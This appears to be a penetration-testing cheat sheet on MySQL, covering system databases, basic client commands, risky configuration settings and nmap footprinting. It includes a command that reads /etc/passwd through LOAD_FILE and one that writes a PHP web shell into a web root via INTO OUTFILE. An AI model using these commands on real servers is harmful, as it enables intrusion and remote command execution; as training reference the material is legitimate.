# MySQL

## <mark style="color:yellow;">ABOUT</mark>

<mark style="color:red;">**MySQL**</mark> is an open-source SQL <mark style="color:purple;">**relational database**</mark> management system developed and supported by Oracle. A database is simply a structured collection of data organized for easy use and retrieval. Default MySQL port is <mark style="color:yellow;">**3306**</mark>. The most important databases fot the MySQL are the <mark style="color:green;">**`system schema (sys)`**</mark> and <mark style="color:green;">**`information schema (information_schema)`**</mark>. The **system schema** contaions tables, information, and metadata necessary for management. The **information schema** contains metadata which mainly retrieved from the system **schema database**.

## <mark style="color:yellow;">Databases</mark>

**MySQL** has default system databases that can help us understand the structure of all the databases that may be hosted on a target server.

| Database                                                   | Description                                                           |
| ---------------------------------------------------------- | --------------------------------------------------------------------- |
| <mark style="color:green;">**`mysql`**</mark>              | Contains tables with required info for the server                     |
| <mark style="color:green;">**`information_schema`**</mark> | Database metadata                                                     |
| <mark style="color:green;">**`performance_schema`**</mark> | Low level monitoring MySQL Server execution                           |
| <mark style="color:green;">**`sys`**</mark>                | Objects that helps devs to use data from performance\_schema database |

## <mark style="color:yellow;">MySQL Useful Commands</mark>

<table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><mark style="color:green;"><strong><code>mysql -u &#x3C;user> -p&#x3C;password> -h &#x3C;IP address></code></strong></mark></td><td>Connect to the MySQL server. There should <strong>not</strong> be a space between the '-p' flag, and the password.</td></tr><tr><td><mark style="color:green;"><strong><code>show databases;</code></strong></mark></td><td>Show all databases</td></tr><tr><td><mark style="color:green;"><strong><code>use &#x3C;database>;</code></strong></mark></td><td>Select one of the existing databases</td></tr><tr><td><mark style="color:green;"><strong><code>show tables;</code></strong></mark></td><td>Show all available tables in the selected database</td></tr><tr><td><mark style="color:green;"><strong><code>show columns from &#x3C;table>;</code></strong></mark></td><td>Show all columns in the selected database</td></tr><tr><td><mark style="color:green;"><strong><code>select * from &#x3C;table>;</code></strong></mark></td><td>Show everything in the desired table</td></tr><tr><td><mark style="color:green;"><strong><code>select * from &#x3C;table> where &#x3C;column> = "&#x3C;string>";</code></strong></mark></td><td>Search for needed <code>string</code> in the desired table</td></tr><tr><td><mark style="color:green;"><strong><code>select LOAD_FILE("/etc/passwd");</code></strong></mark></td><td><em><mark style="color:orange;"><strong>NOT DEFAULT.</strong></mark></em> Reading local files</td></tr><tr><td><pre class="language-bash"><code class="lang-bash">SELECT "&#x3C;?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
</code></pre></td><td><em><mark style="color:orange;"><strong>NOT DEFAULT.</strong></mark></em> Writing local files</td></tr><tr><td><pre class="language-bash"><code class="lang-bash">mysql.exe -u 'mysql_user' -p "password123" -h 127.0.0.1 -D ARASAKA_DB -e "SELECT * FROM users;" > C:\arasaka.htb\static\users_dump.txt
</code></pre></td><td>Extract all users from database</td></tr></tbody></table>

## <mark style="color:yellow;">CMD Interacting</mark>

#### Linux

```bash
mysql -u carni17 -psuperkek123 -h 13.13.13.13
```

#### Windows

```bash
mysql.exe -u carni17 -psuperkek123 -h 13.13.13.13
```

## <mark style="color:yellow;">Dangerous Settings</mark>

#### **Config File Location**

```bash
cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | sed -r '/^\s*$/d'
```

* <mark style="color:green;">**`user`**</mark> - Sets which user the MySQL service will run as
* <mark style="color:green;">**`password`**</mark> - Sets the password for the MySQL user
* <mark style="color:green;">**`admin_address`**</mark> - The IP address on which to listen for TCP/IP connections on the administrative network interface
* <mark style="color:green;">**`debug`**</mark> - This variable indicates the current debugging settings
* <mark style="color:green;">**`sql_warnings`**</mark> - This variable controls whether single-row INSERT statements produce an information string if warnings occur
* <mark style="color:green;">**`secure_file_priv`**</mark> - This variable is used to limit the effect of data import and export operations. If empty - variable have no effect. If NULL - server disables import/export. If directory - import/export is limited to directory.

#### Show variable

```sql
show variables like "secure_file_priv";
```

## <mark style="color:yellow;">Tips2Hack</mark>

1. Nmap Basic Footprinting

```bash
sudo nmap 13.13.13.13 -sV -sC -p3306 --script mysql*
```

***
